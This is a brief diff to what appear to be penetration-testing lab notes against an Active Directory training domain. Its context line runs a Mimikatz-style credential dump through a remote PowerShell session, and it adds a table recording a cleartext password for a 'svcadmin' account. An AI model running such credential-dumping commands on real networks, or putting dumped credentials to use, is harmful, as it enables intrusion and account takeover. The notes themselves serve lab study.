@@ -234,3 +234,7 @@ Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
 
 `DCORP-DC svcadmin creds`
 
+| Type     | Hash                            |
+| -------- | ------------------------------- |
+| Password | *ThisisBlasphemyThisisMadness!! |
+|          |                                 |
